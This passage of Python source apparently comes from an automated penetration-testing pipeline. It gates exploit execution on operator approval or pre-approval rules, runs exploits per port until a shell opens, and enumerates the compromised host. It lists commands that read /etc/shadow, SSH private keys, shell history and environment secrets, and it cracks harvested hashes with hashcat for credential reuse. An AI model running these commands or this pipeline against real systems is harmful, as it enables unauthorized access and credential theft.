    exploit_plan, so a resume re-entering this node repeats nothing.

    The ONE thing that skips the pause is engagement pre-approval, and that is
    not an override: it is the same operator's authorization, given in advance
    for one named engagement. See _engagement_preapproval.
    """
    sid = state["session_id"]

    # Pre-approval short-circuit: the operator already authorised this
    # engagement, so there is nobody to wait for. Parking here would hold an
    # otherwise finished run open until a human came back, possibly next day.
    preapproved, eid = _engagement_preapproval(sid)
    if preapproved:
        pending_ids = _pending_exploits_for_session(sid)
        who = f"engagement_preapproval:{eid}"
        for pid in pending_ids:
            try:
                _mark_approved(pid, who, note="pre-approved for this engagement")
            except Exception as e:  # noqa: BLE001
                _log.warning("[%s] pre-approval mark failed for %s: %s", sid, pid, e)
        _msg(sid, "Exploit",
             f"[pre-approved] Exploit execution is pre-approved for this "
             f"engagement ({eid}), so the run is not pausing for a decision. "
             + (f"Approving {len(pending_ids)} queued exploit(s). "
                if pending_ids else "No queued exploit was found to approve. ")
             + "Scope is still enforced at execution — an out-of-scope target "
               "is refused regardless of pre-approval.",
             role="system")
        _emit("langgraph_exploit_preapproved", sid,
              {"engagement_id": eid, "pending_exploit_ids": pending_ids,
               "approved_by": who})
        return {"phase": "exploit_exec" if pending_ids else "report",
                "exploit_decision": {"approved": True,
                                     "note": f"pre-approved ({who})",
                                     "pending_exploit_ids": pending_ids},
                "findings": [f"exploit_approval: pre-approved ({who}), "
                             f"{len(pending_ids)} exploit(s)"],
                "log": [f"exploit_approval: pre-approved ({who}) x{len(pending_ids)}"]}

    # Standing-rule pre-approval: a target-scoped "approve everything for this
    # IP" rule (exploit_approval_rules) is the operator's advance authorization
    # too — the same short-circuit as engagement pre-approval, keyed on a matching
    # standing rule instead of engagement metadata. Without this the graph parked
    # at awaiting_approval even when such a rule existed.
    rule_name, rule_eng = _target_rule_preapproval(sid)
    if rule_name:
        pending_ids = _pending_exploits_for_session(sid)
        who = f"approval_rule:{rule_name}"
        for pid in pending_ids:
            try:
                _mark_approved(pid, who, note=f"matched standing rule '{rule_name}'")
            except Exception as e:  # noqa: BLE001
                _log.warning("[%s] rule-approval mark failed for %s: %s", sid, pid, e)
        _msg(sid, "Exploit",
             f"[auto-approved] A standing approval rule ('{rule_name}') authorises "
             f"exploit execution for this target, so the run is not pausing for a "
             f"decision. "
             + (f"Approving {len(pending_ids)} queued exploit(s). "
                if pending_ids else "No queued exploit was found to approve. ")
             + "Scope is still enforced at execution — an out-of-scope target is "
               "refused regardless of the rule.",
             role="system")
        _emit("langgraph_exploit_rule_approved", sid,
              {"rule": rule_name, "pending_exploit_ids": pending_ids,
               "approved_by": who})
        return {"phase": "exploit_exec" if pending_ids else "report",
                "exploit_decision": {"approved": True,
                                     "note": f"standing rule ({who})",
                                     "pending_exploit_ids": pending_ids},
                "findings": [f"exploit_approval: standing rule '{rule_name}' "
                             f"({len(pending_ids)} exploit(s))"],
                "log": [f"exploit_approval: standing rule '{rule_name}' "
                        f"x{len(pending_ids)}"]}

    from langgraph.types import interrupt
    # Every queued candidate is named, not just the one the planner liked most.
    # An operator shown a single id cannot tell what else was found, and the
    # others sit `pending` for ever with nothing pointing at them.
    queued = _pending_exploits_for_session(sid)
    decision = interrupt({
        "kind": "exploit_approval",
        "session_id": str(state["session_id"]),
        "target": state.get("target", "")[:300],
        "candidate": (state.get("exploit_candidate") or "")[:2000],
        "queued_exploit_ids": queued,
        "prompt": ("Approve execution of the queued exploit(s)? Reply via "
                   "POST /pentest/{session_id}/approve with "
                   '{"approved": true|false, "pending_exploit_ids": ["<uuid>", ...]}'
                   " — omit the ids to approve everything queued, or pass a "
                   "subset to run only those."),
    })
    if isinstance(decision, dict):
        approved = bool(decision.get("approved"))
        note = str(decision.get("note") or "")
        ids = decision.get("pending_exploit_ids")
        if ids is None:
            one = decision.get("pending_exploit_id")
            # Omitting the ids entirely means "all of them". Naming one means
            # exactly that one — a subset is a deliberate operator choice and
            # must not silently widen.
            ids = [one] if one else list(queued)
        pending_ids = [str(i) for i in (ids or []) if i]
    else:
        approved, note, pending_ids = bool(decision), "", (list(queued) if decision else [])
    _msg(sid, "Exploit",
         f"[operator decision] approved={approved}"
         f"{' exploits=' + str(len(pending_ids)) if pending_ids else ''}"
         f"{chr(10) + 'note: ' + note[:500] if note else ''}",
         role="user")
    _emit("langgraph_exploit_decision", sid,
          {"approved": approved, "pending_exploit_ids": pending_ids})
    return {"phase": "exploit_exec" if (approved and pending_ids) else "report",
            "exploit_decision": {"approved": approved, "note": note[:500],
                                 "pending_exploit_ids": pending_ids},
            "findings": [f"exploit_approval: approved={approved}, "
                         f"{len(pending_ids)} exploit(s)"],
            "log": [f"exploit_approval: approved={approved} x{len(pending_ids)}"]}


def _mark_approved(pending_id, who: str, note: str = None) -> None:
    """Transition a pending_exploit to status='approved' so the downstream
    execute_approved_exploit (which REQUIRES that status and otherwise refuses
    "not approved") will run it. The operator's decision at the approval
    interrupt — or the auto-exploit opt-in — IS the authorization; this records
    it. execute_approved_exploit still fails closed on scope, so this can never
    turn an out-of-scope target runnable."""
    try:
        import db_utils as _du
        _du.approve_exploit(pending_id, reviewed_by=who, notes=note)
    except Exception as _e:  # noqa: BLE001
        _log.warning("approve_exploit(%s) failed: %s", pending_id, _e)


def _gave_shell(result_str: str) -> bool:
    """True when an exploit attempt actually got us in.

    execute_approved_exploit returns JSON with ok/success, and for Metasploit a
    session_id/session_type when a session opened. ok+success is the foothold
    signal — a Metasploit session, or an exploitdb script that ran and reported
    success. The caller only asks this for shell-yielding exploit types, so a
    scanner's 'success' can never be mistaken for a shell here.
    """
    try:
        d = json.loads(result_str)
    except Exception:  # noqa: BLE001
        return False
    return bool(d.get("ok") and d.get("success"))


def _exploit_meta(ids):
    """Per-exploit facts needed to group and order execution: unique port,
    whether the type can yield a shell, and evidence strength.

    One query keyed by id. Ids the query does not return are simply absent, and
    the caller treats an absent id as a port-less, non-shell candidate — so a
    lookup failure degrades to "attempt each once", never to "attempt nothing".
    """
    out = {}
    if not ids:
        return out
    try:
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                "SELECT id::text, target_port, exploit_type, exploit_category, "
                "       match_confidence "
                "  FROM pending_exploits WHERE id = ANY(%s::uuid[])",
                ([str(i) for i in ids],))
            for rid, port, etype, cat, conf in cur.fetchall():
                out[rid] = {"port": port, "etype": etype,
                            "category": cat, "confidence": conf}
    except Exception as e:  # noqa: BLE001
        _log.warning("exploit metadata lookup failed: %s", e)
    return out


def _execute_pending_exploits(sid, pending_ids, *, approver: str,
                              note=None, agent: str = "Exploit",
                              budget_s: int = None) -> dict:
    """Execute a set of pending exploits, grouped by UNIQUE PORT, shell-yielding
    first, stopping a port the moment one attempt lands a shell. Bounded PER PORT
    by MAX_EXPLOITS_PER_PORT and (optionally) by a wall-clock budget. Each dispatch
    goes through execute_approved_exploit -> the exploit-runner's scope gate, which
    fails CLOSED on out-of-scope. Returns a summary dict. Shared by exploit_exec
    (operator/pre-approved graph node) and the post-scan re-analysis executor so
    both use one bounded, port-covering implementation."""
    import time as _t
    pending_ids = [str(p) for p in (pending_ids or []) if p]
    deadline = (_t.monotonic() + budget_s) if budget_s else None
    metas = _exploit_meta(pending_ids)
    groups, order = {}, []
    for pid in pending_ids:
        m = metas.get(pid) or {}
        port = m.get("port")
        key = port if port is not None else f"_noport:{pid}"
        if key not in groups:
            groups[key] = []
            order.append(key)
        groups[key].append(pid)

    def _rank(pid):
        m = metas.get(pid) or {}
        is_shell = 0 if (m.get("etype") in _SHELL_EXPLOIT_TYPES
                         and m.get("category") != "dos") else 1
        try:
            conf = float(m.get("confidence") or 0)
        except (TypeError, ValueError):
            conf = 0.0
        return (is_shell, -conf)

    executed, failed, shells, per_port = [], [], [], []
    stopped_early = False
    for key in order:
        if deadline and _t.monotonic() >= deadline:
            stopped_early = True
            break
        ids = sorted(groups[key], key=_rank)
        port = None if str(key).startswith("_noport:") else key
        got_shell, attempted = False, 0
        for pid in ids:
            if attempted >= MAX_EXPLOITS_PER_PORT:
                _msg(sid, agent,
                     f"[port {port}] reached MAX_EXPLOITS_PER_PORT="
                     f"{MAX_EXPLOITS_PER_PORT}; {len(ids) - attempted} "
                     f"candidate(s) not attempted on this port.")
                break
            if deadline and _t.monotonic() >= deadline:
                stopped_early = True
                break
            attempted += 1
            try:
                _mark_approved(pid, approver, note)
                result = _tool(scan_tools.execute_approved_exploit, pid)
                _msg(sid, agent,
                     f"[execute_approved_exploit {pid} port={port}]\n{result[:1200]}")
                executed.append(pid)
                m = metas.get(pid) or {}
                if (m.get("etype") in _SHELL_EXPLOIT_TYPES
                        and m.get("category") != "dos" and _gave_shell(result)):
                    got_shell = True
                    shells.append(pid)
                    _msg(sid, agent,
                         f"[port {port}] shell obtained via {pid} — stopping this "
                         f"port; {len(ids) - attempted} remaining candidate(s) "
                         f"not needed.")
                    break
            except Exception as e:  # noqa: BLE001
                _msg(sid, agent,
                     f"[execute_approved_exploit {pid} port={port}] FAILED: {e}")
                failed.append(pid)
        per_port.append({"port": port, "candidates": len(ids),
                         "attempted": attempted, "shell": got_shell})
    return {"executed": executed, "failed": failed, "shells": shells,
            "ports": len(order), "per_port": per_port,
            "stopped_early": stopped_early}


def exploit_exec(state: PentestState) -> dict:
    """Execute the operator-approved exploits, grouped by UNIQUE PORT.

    Every approved id, not just the first. A host with 26 open services yielded
    one queued exploit and one execution, and the operator had no way to tell
    whether the rest had been considered or never looked at.

    Grouped by unique port, shell-yielding candidates first (strongest evidence
    first), and a port STOPS the moment one attempt lands a shell — a second
    foothold on a port we already hold is wasted noise on the target, and the
    access ranker measures and picks among shells across ports afterwards.

    Sequential on purpose (exploits are heavier and less reversible than scans,
    so never fired in parallel), and bounded PER PORT by MAX_EXPLOITS_PER_PORT
    rather than by a flat session total — a flat total dropped whole ports, so a
    foothold on a late service was never tried. Every unique port is covered.
    """
    sid = state["session_id"]
    decision = state.get("exploit_decision") or {}
    pending_ids = decision.get("pending_exploit_ids")
    if pending_ids is None:
        # Resumed from a checkpoint written before this took a list.
        one = decision.get("pending_exploit_id")
        pending_ids = [one] if one else []
    pending_ids = [str(p) for p in pending_ids if p]

    if not pending_ids:
        _msg(sid, "Exploit",
             "[approved but no pending_exploit_id supplied] Nothing executed. "
             "Re-approve with the ids from list_pending_exploits.")
        _emit("langgraph_exploit_executed", sid, {"executed": 0,
                                                  "reason": "no pending_exploit_id"})
        return {"phase": "post_enumeration",
                "findings": ["exploit_exec: skipped (no id)"],
                "log": ["exploit_exec skipped: no pending_exploit_id"]}

    summary = _execute_pending_exploits(
        sid, pending_ids, approver="operator (exploit approval)",
        note=decision.get("note"), agent="Exploit")
    executed, failed, shells = summary["executed"], summary["failed"], summary["shells"]
    # summary["ports"] is already the COUNT of unique ports (an int), not a list.
    ports_n, per_port = summary["ports"], summary["per_port"]

    _emit("langgraph_exploit_executed", sid,
          {"executed": len(executed), "failed": len(failed),
           "shells": len(shells), "ports": ports_n, "per_port": per_port,
           "pending_exploit_ids": executed})
    findings = [f"exploit_exec: {ports_n} unique port(s); {len(executed)} run, "
                f"{len(shells)} shell(s), {len(failed)} failed"]
    if failed:
        findings.append(f"exploit_exec: {len(failed)} failed to execute")
    return {"phase": "post_enumeration", "findings": findings,
            "log": [f"exploit_exec: ports={ports_n} executed={executed} "
                    f"shells={shells} failed={failed}"]}


# How many passes the loop may make before it reports regardless.
#
# It normally settles on its own — a pass that analyses nothing new and proposes
# nothing new is the stopping condition — but "normally" is not a guarantee, and
# a cycle that cannot terminate is worse than one that stops early and says so.
MAX_ENUMERATION_CYCLES = int(os.environ.get("MAX_ENUMERATION_CYCLES", "5"))


def _after_post_enumeration(state: PentestState) -> str:
    """Go round again, or report.

    The loop settles when a pass produced no new analysis AND no new proposals:
    at that point there is nothing left that this cycle can act on, which is
    what "everything has been analysed" means operationally. Without a
    measurable stopping condition the loop would either run forever or stop
    after a fixed count and call that done.
    """
    cycles = int(state.get("enumeration_cycles") or 0)
    if cycles >= MAX_ENUMERATION_CYCLES:
        return "report"
    history = state.get("enumeration_history") or []
    if not history:
        return "report"
    last = history[-1]
    if (last.get("analysed") or 0) == 0 and (last.get("queued") or 0) == 0 \
            and (last.get("resolved") or 0) == 0:
        return "report"
    return "post_enumeration"


def post_enumeration(state: PentestState) -> dict:
    """Post-exploitation enumeration: read what every tool produced, and do the
    checklist the methodology already specifies.

    WHY THIS PHASE EXISTS
    ---------------------
    The graph went `exploit_exec -> report`. A run could execute an exploit, or
    recover ten working credentials, and then stop — nothing enumerated the
    access, nothing read back the output the session's own tools had produced,
    and the report could not say what had been skipped because nothing could
    enumerate the steps.

    `knowledge/playbooks/*.yaml` now can. The SSH "Post-Exploitation / If Access
    Gained" checklist — sudo rights, authorized_keys, known_hosts, sshd_config —
    was prose for a language model until `scripts/playbooks_to_yaml.py` extracted
    it, and this is the phase that acts on it.

    WHAT IT DOES
    ------------
      1. ANALYSE. Every tool_executions row for this session is re-read through
         the parser registry, so output nobody looked at becomes counted
         results. A run that produced something nobody parsed is the defect this
         whole area keeps producing.
      2. ENUMERATE. For each service where the session actually holds a working
         credential, the playbook's post-access steps are proposed as PENDING
         recommendations through the scope gate.

    WHAT IT DOES NOT DO
    -------------------
    It does not dispatch, and it never proposes a MUTATING step. 45 of the 266
    extracted steps write to the target — `useradd backdoor`, `>> authorized_keys`
    — and `steps_for()` excludes them unless asked; this phase does not ask.
    Persistence is an operator's deliberate act, not a pipeline's default.
    """
    sid = state["session_id"]
    target = state.get("target") or ""
    cycle = int(state.get("enumeration_cycles") or 0) + 1
    log: List[str] = []
    findings: List[str] = []

    # REVIEW EVIDENCE FIRST. Anything proposed on an earlier pass may have run
    # by now, and knowing whether it produced something is what makes the next
    # decision different from the last one. Without this the loop would propose
    # the same things forever and never learn that they did not help.
    resolved = _resolve_outcomes()
    if resolved.get("resolved"):
        findings.append(
            f"post_enumeration[{cycle}]: reviewed {resolved['resolved']} earlier "
            f"proposals, {resolved['produced']} produced new evidence")
    if resolved.get("still_running"):
        # A third state. Recording "not finished yet" as "produced nothing"
        # would suppress rules for being slow.
        log.append(f"post_enumeration: {resolved['still_running']} proposals "
                   f"still running, left unresolved")

    analysed = _analyse_session_output(sid)
    if analysed.get("examined"):
        if analysed.get("backfilled"):
            findings.append(
                f"post_enumeration[{cycle}]: read {analysed['backfilled']} tool "
                f"outputs nobody had parsed "
                f"({analysed['productive']} produced results)")
        else:
            # Say that there was nothing new, rather than repeating the same
            # totals every cycle as if work were happening.
            findings.append(
                f"post_enumeration[{cycle}]: nothing new to parse "
                f"({analysed['parsed']} of {analysed['examined']} already read)")
        log.append(f"post_enumeration: analysis {analysed}")
        if analysed.get("unparsed_tools"):
            # Named, not counted. "17 unparsed" is not actionable; the tool
            # names are, because each one is a parser somebody can write.
            findings.append(
                "post_enumeration: no parser for " +
                ", ".join(sorted(analysed["unparsed_tools"])[:8]))

    # The same analysis every individual command already went through, run once
    # more over the session as a whole. The per-command hook in kali_listener is
    # the primary path; this catches anything that did not go through it — a
    # tool dispatched by another runner, or a command that finished while the
    # listener was restarting.
    swept = _sweep_enumeration(target)
    if swept.get("queued"):
        findings.append(
            f"post_enumeration: {swept['queued']} follow-on checks proposed from "
            f"what {swept['examined']} commands found")
    if swept.get("refused"):
        # Refusals are REPORTED. A known_hosts entry naming an out-of-scope host
        # is a real finding about the engagement's boundary, and dropping it
        # silently makes it look like nothing was found.
        findings.append(
            f"post_enumeration: {swept['refused']} follow-ons refused by the "
            f"scope gate (leads outside scope)")
    if swept.get("suppressed"):
        findings.append(
            "post_enumeration: rules no longer firing (tried and never "
            "produced): " + ", ".join(sorted(set(swept["suppressed"]))[:5]))

    # Run the checklist through the best shell we hold, if we hold one. This is
    # enumeration through access already obtained by an approved exploit, not a
    # new dispatch — so it runs rather than being queued for someone to press.
    through = _enumerate_through_best_access(sid, target)
    if through.get("ran"):
        a = through["access"]
        findings.append(
            f"post_enumeration: ran {through['ran']} post-access check(s) "
            f"through {a['kind']} {a['handle']} "
            f"(whoami={a.get('whoami') or '?'}, root={a.get('is_root')})")
        for stp in through["steps"]:
            if stp["ok"] and stp["output"].strip():
                _msg(sid, "PostEnumeration",
                     f"[{stp['title']}] {stp['command']}\n{stp['output'][:900]}")
        # Turn the dumped /etc/shadow into cracked, reusable passwords — a root
        # shell that only prints hashes has done half the job.
        loot = _harvest_shell_loot(sid, target, through.get("steps"))
        if loot.get("hashes"):
            findings.append(
                f"post_enumeration: harvested {loot['hashes']} /etc/shadow hash(es) "
                f"from the held shell → stored {loot.get('stored', 0)}, cracked "
                f"{loot.get('cracked', 0)} to plaintext (credential reuse enabled)")
            _msg(sid, "PostEnumeration",
                 f"[loot] /etc/shadow: {loot['hashes']} hash(es) harvested, "
                 f"{loot.get('cracked', 0)} cracked to plaintext via offline hashcat "
                 f"— stored as credentials for reuse/lateral movement.")
        # DETECTION-TRIGGERED STEP: a DB listening only on loopback is reachable
        # only through this host — enumerate it locally via the shell when found.
        dbenum = _enumerate_local_databases(sid, target, through.get("steps"))
        if dbenum.get("dbs"):
            findings.append(
                f"post_enumeration: detected {len(dbenum['dbs'])} local-only "
                f"database(s) ({', '.join(dbenum['dbs'])}) — ran {dbenum.get('ran', 0)} "
                f"local DB enumeration command(s) through the held shell"
                + (f" [{dbenum['reason']}]" if dbenum.get('reason') else ""))
    elif through.get("reason"):
        findings.append(f"post_enumeration: {through['reason']}")

    enumerated = _enumerate_post_access(sid, target)
    if enumerated.get("queued"):
        findings.append(
            f"post_enumeration: queued {enumerated['queued']} post-access checks "
            f"from the methodology for {', '.join(enumerated['services'])}")
    elif enumerated.get("reason"):
        # A phase that did nothing must say why. "Nothing to enumerate" and
        # "we hold no credential" are different states and only one is a gap.
        findings.append(f"post_enumeration: nothing enumerated ({enumerated['reason']})")
    log.append(f"post_enumeration: enumeration {enumerated}")

    entry = {
        "cycle": cycle,
        "resolved": resolved.get("resolved", 0),
        "produced": resolved.get("produced", 0),
        # What this pass ACTUALLY DID, not what it looked at. `parsed` counts
        # every row re-read and never falls to zero, so using it meant the loop
        # could never settle.
        "analysed": analysed.get("backfilled", 0),
        "re_read": analysed.get("parsed", 0),
        "queued": (swept.get("queued", 0) + enumerated.get("queued", 0)),
        "refused": swept.get("refused", 0),
        "remaining": analysed.get("unanalysed", 0),
        "ran_through_access": through.get("ran", 0),
    }
    if not findings:
        # A pass that did nothing must still say so, or the history reads as a
        # gap rather than as a settled loop.
        findings.append(
            f"post_enumeration[{cycle}]: nothing new to analyse or propose")
    _msg(sid, "PostEnumeration", "\n".join(findings))
    _emit("langgraph_post_enumeration", sid, {
        "target": target, "cycle": cycle, "analysed": analysed,
        "enumerated": enumerated, "swept": swept, "resolved": resolved})
    return {"phase": "report", "findings": findings, "log": log,
            "enumeration_cycles": cycle, "enumeration_history": [entry]}


def _resolve_outcomes() -> dict:
    """Close out proposals whose dispatch has finished, whatever ran them.

    Path-independent on purpose: a proposal sent to a native runner finishes in
    `scans` and never reaches the listener's hook, so reading one command's
    stdout left those observations unresolved forever. This asks whether new
    EVIDENCE appeared for the target instead — which counts web_findings too.
    """
    try:
        from etl.post_enumeration import resolve_pending_observations
    except Exception as e:  # noqa: BLE001
        return {"error": f"unavailable: {e}", "resolved": 0, "produced": 0}
    try:
        return resolve_pending_observations()
    except Exception as e:  # noqa: BLE001
        return {"error": str(e)[:200], "resolved": 0, "produced": 0}


def _sweep_enumeration(target: str) -> dict:
    """Run the post-enumeration analysis over recent commands.

    One function, two callers: kali_listener runs it per command as each
    finishes, and this runs it over the session. Two analyses that had to agree
    would drift, and the one that drifted would be the one nobody watched.
    """
    out = {"examined": 0, "queued": 0, "refused": 0, "suppressed": [],
           "facts": 0, "available": False}
    try:
        import psycopg2
        from psycopg2.extras import RealDictCursor
        from etl.post_enumeration import analyse
    except Exception as e:  # noqa: BLE001
        out["error"] = f"unavailable: {e}"
        return out
    dsn = os.environ.get("DB_DSN") or os.environ.get("DATABASE_URL")
    if not dsn:
        out["error"] = "no DB_DSN"
        return out
    try:
        with psycopg2.connect(dsn, connect_timeout=5) as conn, \
                conn.cursor(cursor_factory=RealDictCursor) as cur:
            params = []
            where = ["started_at > now() - interval '12 hours'",
                     "COALESCE(output,'') <> ''"]
            if target:
                where.append("target = %s")
                params.append(target)
            cur.execute(
                f"""SELECT id::text, tool, target, port, service,
                           COALESCE(output,'') AS output,
                           COALESCE(error,'') AS error, parsed_results
                      FROM tool_executions
                     WHERE {' AND '.join(where)}
                     ORDER BY started_at DESC LIMIT 100""", params)
            rows = cur.fetchall()
        out["available"] = True
        for r in rows:
            out["examined"] += 1
            # BATCH path: deterministic extraction + rules only. The LLM roles
            # (extraction/review) would fire per row over up to 100 executions
            # and serialise ~20s calls into a 30-minute sweep. The LLM fallback
            # runs on FRESH single-command output (the per-command hook), bounded
            # by the router budget — not here.
            res = analyse(dict(r), allow_llm=False)
            out["facts"] += res.get("facts", 0)
            out["queued"] += res.get("queued", 0)
            out["refused"] += res.get("refused", 0)
            out["suppressed"].extend(res.get("suppressed") or [])

        # Evidence that never came from a command's stdout. web_findings alone
        # holds more rows than every other finding table combined, and none of
        # it was reachable while this loop read tool output rather than results.
        try:
            from etl.post_enumeration import analyse_findings
            fres = analyse_findings(target=target)
            out["examined"] += fres.get("facts", 0)
            out["facts"] += fres.get("facts", 0)
            out["queued"] += fres.get("queued", 0)
            out["refused"] += fres.get("refused", 0)
            out["suppressed"].extend(fres.get("suppressed") or [])
        except Exception as e:  # noqa: BLE001
            out.setdefault("errors", []).append(f"findings: {str(e)[:120]}")
    except Exception as e:  # noqa: BLE001
        out["error"] = str(e)[:200]
    return out


def _analyse_session_output(sid) -> dict:
    """Re-read every tool output this session produced, through the parsers.

    The point is the ones nobody looked at. `tool_executions.parsed_results` was
    NULL for every run until recently, so output that had been captured and
    stored taught nothing — a netexec run wrote 6,816 bytes and was recorded as
    an unmeasured success.
    """
    out = {"examined": 0, "parsed": 0, "backfilled": 0, "productive": 0,
           "unparsed_tools": [], "results": 0, "available": False}
    try:
        import psycopg2
        from psycopg2.extras import RealDictCursor
        from etl.tool_output_parsers import parse_for, result_count
    except Exception as e:  # noqa: BLE001
        out["error"] = f"unavailable: {e}"
        return out
    dsn = os.environ.get("DB_DSN") or os.environ.get("DATABASE_URL")
    if not dsn:
        out["error"] = "no DB_DSN"
        return out
    try:
        with psycopg2.connect(dsn, connect_timeout=5) as conn, \
                conn.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute(
                """
                SELECT id::text, tool, COALESCE(output,'') AS output,
                       COALESCE(error,'') AS error, parsed_results
                  FROM tool_executions
                 WHERE started_at > now() - interval '12 hours'
                   AND COALESCE(output,'') <> ''
                 ORDER BY started_at DESC
                 LIMIT 200
                """)
            rows = cur.fetchall()
            out["available"] = True
            unparsed = set()
            for r in rows:
                out["examined"] += 1
                parsed = r["parsed_results"]
                if parsed is None:
                    parsed = parse_for(r["tool"], r["output"], r["error"])
                    if parsed is not None:
                        # NEW work, as distinct from re-reading something that
                        # was already parsed. The loop's stopping condition
                        # depends on this: counting re-reads made every cycle
                        # report the same 32 and the loop burned its whole
                        # budget doing identical work.
                        out["backfilled"] += 1
                        # Backfill: the output was already stored, so the only
                        # thing missing was somebody reading it.
                        cur.execute(
                            "UPDATE tool_executions SET parsed_results = %s "
                            "WHERE id = %s::uuid",
                            (psycopg2.extras.Json(parsed), r["id"]))
                if parsed is None:
                    unparsed.add(r["tool"])
                    continue
                out["parsed"] += 1
                n = result_count(parsed)
                if n:
                    out["productive"] += 1
                    out["results"] += n
            out["unparsed_tools"] = sorted(unparsed)
            try:
                from etl.evidence import unanalysed
                out["unanalysed"] = unanalysed(cur).get("total", 0)
            except Exception:  # noqa: BLE001
                out["unanalysed"] = 0
            conn.commit()
    except Exception as e:  # noqa: BLE001
        out["error"] = str(e)[:200]
    return out


# How to reach a service with a credential and run one command on it.
#
# Only ssh today, and that is stated rather than left as an empty dict: a
# protocol with no wrapper produces no queued steps, and "we cannot reach this
# service" is a real answer that belongs in the report.
#
# {password} stays LITERAL — the recommendation carries credential_id and the
# dispatcher resolves it in memory, so the secret never reaches the stored
# command. Same contract as etl/credential_followups.py.
def _wrap_remote(protocol: str, ip: str, port, command: str) -> Optional[str]:
    """A locally-written playbook step, wrapped to run on the target."""
    proto = (protocol or "").strip().lower()
    if proto != "ssh":
        return None
    opts = ["-oStrictHostKeyChecking=no", "-oConnectTimeout=10"]
    try:
        # Algorithm options derived from what recon measured about this host.
        # Without them ssh refuses to negotiate with a legacy server at all,
        # and every one of these steps fails before it runs.
        from etl.target_capabilities import settings_for
        opts = list(settings_for("ssh", ip, port=port)) + opts
    except Exception:  # noqa: BLE001
        pass
    # stdin closed. `sudo -l` on the target prompts for a password, and over a
    # non-interactive ssh channel that HANGS until the job times out rather than
    # failing — the run reported `[sudo] password for msfadmin:` on stderr and
    # nothing else after burning the whole timeout. Closing stdin makes anything
    # that prompts fail immediately and say so, which is a result.
    safe = command.replace("'", "'\\''")
    return (f"sshpass -p '{{password}}' ssh {' '.join(opts)} "
            f"-p {port or 22} {{username}}@{ip} '{safe}' < /dev/null")


# The read-only info-gathering commands most likely to yield actionable next
# steps through a held *nix shell, highest-payoff first. Kind-agnostic (works on
# bind/command/meterpreter/ssh access), and NONE mutate the target — this is
# enumeration, not persistence. A root-only read (e.g. /etc/shadow) simply
# returns nothing on a user shell rather than erroring the sequence.
_POSTEX_INFO_COMMANDS_FALLBACK = [
    ("id", "Current identity & groups", "id"),
    ("uname", "Kernel / OS (privesc surface)", "uname -a"),
    ("os_release", "Distro release", "cat /etc/issue /etc/os-release 2>/dev/null"),
    ("whoami_hostname", "Host & user", "hostname; whoami"),
    ("passwd", "Local users", "cat /etc/passwd"),
    ("shadow", "Password hashes (root only)", "cat /etc/shadow 2>/dev/null"),
    ("sudo_l", "Sudo rights (no password)", "sudo -n -l 2>/dev/null"),
    ("suid", "SUID binaries (privesc)",
     "find / -perm -4000 -type f 2>/dev/null"),
    ("caps", "File capabilities (privesc)",
     "getcap -r / 2>/dev/null"),
    ("crontab", "System cron jobs",
     "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"),
    ("listen", "Listening services (pivot targets)",
     "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("net", "Network interfaces & routes",
     "ip a 2>/dev/null || ifconfig -a 2>/dev/null; ip route 2>/dev/null"),
    ("homes", "Home directories", "ls -la /root /home/* 2>/dev/null"),
    ("history", "Shell history (creds/commands)",
     "cat /root/.bash_history /home/*/.bash_history 2>/dev/null"),
    ("ssh_keys", "SSH private keys",
     "cat /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null"),
    ("env", "Environment (secrets in env)", "env 2>/dev/null"),
    ("db_conf", "Web/app config files (DB creds)",
     "grep -rIl --include=*.php --include=*.conf --include=*.env "
     "-e password -e passwd -e secret /var/www /etc 2>/dev/null | head -20"),
    ("procs", "Running processes", "ps aux 2>/dev/null || ps -ef 2>/dev/null"),
]


def _harvest_shell_loot(sid, target: str, steps: list) -> dict:
    """Turn a held shell's ALREADY-DUMPED /etc/shadow into usable passwords.

    _enumerate_through_best_access dumps /etc/shadow (readable only as root) but
    only ever posted it as a message — the hashes were never parsed, stored, or
    cracked, so a ROOT shell produced zero reusable credentials. This closes that
    loop: parse the shadow hashes we already hold, store them as crackable
    credential_findings, and fire the offline hashcat crack in the exploit-runner
    (which then stores the plaintext, feeding the credential-reuse / lateral
    path). Runs for any held shell, including a pre-existing backdoor that no
    exploit opened (so /postex/enumerate was never auto-fired for it).

    Best-effort; never raises into the enumeration."""
    out = {"hashes": 0, "stored": 0, "cracked": 0}
    try:
        import re as _re
        import requests as _rq
        by_id = {stp.get("step"): (stp.get("output") or "") for stp in (steps or [])}
        shadow = by_id.get("shadow", "")
        # user:$id$salt$hash: — crypt hashes only ($1/$5/$6/$2y/$y ...)
        rows = _re.findall(r"(?im)^([a-z_][a-z0-9_-]*):(\$[0-9a-z]{1,2}\$[^:\s]+):", shadow)
        if not rows:
            return out
        out["hashes"] = len(rows)
        rag = os.environ.get("RAG_API_URL") or "https://rag-api:8000"
        er = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")
        api_key = os.environ.get("API_KEY", "changeme")
        for user, h in rows:
            try:
                r = _rq.post(f"{rag}/credentials",
                             params={"ip": target, "port": 22, "protocol": "ssh",
                                     "username": user, "secret_value": h,
                                     "secret_type": "hash", "status": "unknown",
                                     "source": "postex:shadow"},
                             headers={"x-api-key": api_key}, timeout=10, verify=False)
                if r.status_code < 400:
                    out["stored"] += 1
            except Exception:  # noqa: BLE001
                pass
        # Offline crack (exploit-runner holds hashcat + the wordlist mount). It
        # reads the hashes we just stored, cracks, and stores the plaintext.
        try:
            r = _rq.post(f"{er}/crack/{target}",
                         headers={"x-api-key": api_key}, timeout=600, verify=False)
            d = r.json() if r.status_code < 400 else {}
            out["cracked"] = d.get("cracked", 0)
        except Exception as e:  # noqa: BLE001
            out["crack_error"] = str(e)[:160]
        # REVALIDATE now: probe the freshly-cracked creds so any that work flip to
        # valid and their login attempts are recorded immediately (dump -> crack ->
        # store -> revalidate in one flow), not only on the next access sweep.
        if out.get("cracked"):
            try:
                from etl import access as _ax
                rv = _ax.refresh(target)
                out["revalidated_live"] = rv.get("live", 0)
            except Exception as e:  # noqa: BLE001
                out["revalidate_error"] = str(e)[:160]
    except Exception as e:  # noqa: BLE001
        out["error"] = str(e)[:160]
    return out


# Local (loopback-bound) DB services worth enumerating THROUGH a held shell —
# they are unreachable externally, so an external scan never sees them, but a
# shell can query them locally (often as root with no password). Read-only.
_LOCAL_DB_PROBES_FALLBACK = {
